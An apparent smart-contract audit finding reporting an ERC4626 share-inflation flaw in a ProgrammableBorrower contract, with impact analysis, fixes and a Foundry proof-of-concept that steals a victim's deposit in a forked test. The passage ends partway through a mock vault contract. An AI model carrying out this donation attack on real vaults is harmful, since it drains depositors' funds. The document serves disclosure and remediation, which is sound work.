### Title
ProgrammableBorrower ERC4626 first-deposit inflation lets an attacker steal an epoch’s idle liquidity - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits idle credit-vault funds into an arbitrary configured ERC4626 vault and accepts the returned share amount without checking a minimum or comparing it with the deposited assets. If that vault uses naive `assets * totalSupply / totalAssets` pricing, an attacker can make the first deposit, donate underlying to inflate the share price, and cause the programmable borrower to receive zero shares for the credit vault’s epoch liquidity. The attacker can then redeem their single share for the donated assets plus the deposit, leaving the CDO’s strategy-token backing unrecoverable.

### Finding Description
When an epoch starts, the CDO transfers idle underlying to the configured borrower and invokes `onStartEpoch`, which deposits the programmable borrower’s full underlying balance into the configured ERC4626 vault. [1](#0-0) [2](#0-1) 

`_depositToVault` records the returned share count only for the event and accounting baseline; it does not require `shares > 0`, check `convertToAssets(shares)`, or enforce a minimum acceptable share amount. [3](#0-2) 

An attacker can deposit `1` wei into a newly configured vulnerable ERC4626 vault to receive one share, then donate more underlying than the pending programmable-borrower deposit. When the vault calculates `shares = assets * totalSupply / totalAssets`, the programmable borrower’s deposit of `assets` mints zero shares while still transferring the full deposit to the vault. [4](#0-3) 

The borrower’s later vault valuation uses `vault.convertToAssets(vault.balanceOf(address(this)))`, so a zero-share balance is treated as having zero recoverable assets despite the deposit having been transferred. [5](#0-4) 

When the CDO later requests liquidity, `onStopEpoch` sees that the shortfall exceeds the current vault assets, returns without supplying funds, and the subsequent `transferFrom` failure routes the CDO into borrower-default handling. [6](#0-5) [7](#0-6) [8](#0-7) 

### Impact Explanation
The attacker can steal substantially all idle underlying parked by `ProgrammableBorrower`, less the one-wei seed deposit. For example, with a `10,000 USDC` victim deposit and a `20,000 USDC` donation, the borrower mints `10,000e6 / (20,000e6 + 1) = 0` shares, while the attacker’s one share can redeem `30,000.000001 USDC`.

The CDO still holds strategy tokens representing the deposit, but the programmable borrower holds neither underlying nor vault shares to repay it. Withdrawal funding or pool closure therefore hits the borrower-default path, producing direct insolvency rather than a temporary valuation discrepancy. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be empty or economically near-empty and vulnerable to donation-based share inflation before the programmable borrower’s first vault deposit. This is realistic immediately after `initialize` or `setVault`, because the borrower then parks all idle funds during `onStartEpoch`. [11](#0-10) [12](#0-11) 

The attacker needs no CDO, borrower, manager, owner, or Keyring privilege: they only call the external vault’s public `deposit`, directly transfer its underlying asset, and redeem their vault share. The missing minimum-share check makes a zero-share deposit succeed silently instead of reverting.

### Recommendation
Require a minimum acceptable vault share amount or recovered asset value in `_depositToVault`.

A robust implementation should:
- call `previewDeposit` and revert if the expected shares or `convertToAssets(expectedShares)` is materially below the deposited amount;
- revert if `shares == 0` for a nonzero deposit;
- compare pre-deposit and post-deposit `convertToAssets(vault.balanceOf(address(this)))` against the deposited amount;
- require newly configured vaults to have minimum existing supply/liquidity or use only audited ERC4626 implementations with inflation protection.

### Proof of Concept
Place this test in `test/foundry/ProgrammableBorrowerCreditVault.t.sol`, which already forks mainnet, uses real USDC, and defines `MockStopEpochLiquidityVault` with donation-sensitive share pricing. [13](#0-12) [14](#0-13) 

```solidity
function testProgrammableBorrowerVaultShareInflationStealsEpochDeposit() external {
    MockStopEpochLiquidityVault inflationVault = new MockStopEpochLiquidityVault(USDC);
    address attacker = makeAddr("vaultInflationAttacker");

    uint256 victimDeposit = 10_000 * oneScale;
    uint256 donation = 20_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    // Honest manager configures an ERC4626 vault that has not yet been seeded.
    vm.prank(manager);
    programmableBorrower.setVault(address(inflationVault));

    // Attacker makes the first vault deposit and inflates assets/share via donation.
    deal(USDC, attacker, donation + 1, true);
    vm.startPrank(attacker);
    underlying.approve(address(inflationVault), 1);
    uint256 attackerShares = inflationVault.deposit(1, attacker);
    underlying.transfer(address(inflationVault), donation);
    vm.stopPrank();

    assertEq(attackerShares, 1);
    assertEq(inflationVault.balanceOf(attacker), 1);

    // Victim deposits into the credit vault while the pool is in the buffer phase.
    idleCDO.depositAA(victimDeposit);

    // Honest manager starts the epoch; ProgrammableBorrower parks the funds in the vault.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    // shares = victimDeposit * 1 / (donation + 1) == 0.
    assertEq(inflationVault.balanceOf(address(programmableBorrower)), 0);

    // The attacker redeems the only share for donation + seed + victim deposit.
    uint256 attackerBalanceBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    uint256 attackerProceeds = inflationVault.redeem(1, attacker, attacker);

    assertEq(attackerProceeds, donation + 1 + victimDeposit);
    assertEq(
        underlying.balanceOf(attacker) - attackerBalanceBefore,
        donation + 1 + victimDeposit
    );

    // The programmable borrower reports no recoverable vault assets.
    assertEq(programmableBorrower.vaultSharesBalance(), 0);
    assertEq(programmableBorrower.vaultLoss(), victimDeposit);

    // Closing the pool cannot source the strategy-token principal and defaults.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 1);

    assertTrue(cdoEpoch.defaulted());
    assertEq(strategy.balanceOf(address(cdoEpoch)), victimDeposit);
}
```

contract MockStopEpochLiquidityVault is ERC20 {
  IERC20Detailed public immutable assetToken;
  uint256 public withdrawLimit = type(uint256).max;

  constructor(address _asset) ERC20("Stop Epoch Liquidity Vault", "SELV") {
    assetToken = IERC20Detailed(_asset);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    uint256 assets = convertToAssets(balanceOf(owner));
    return assets < withdrawLimit ? assets : withdrawLimit;
  }

  function setWithdrawLimit(uint256 assets) external {
    withdrawLimit = assets;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }
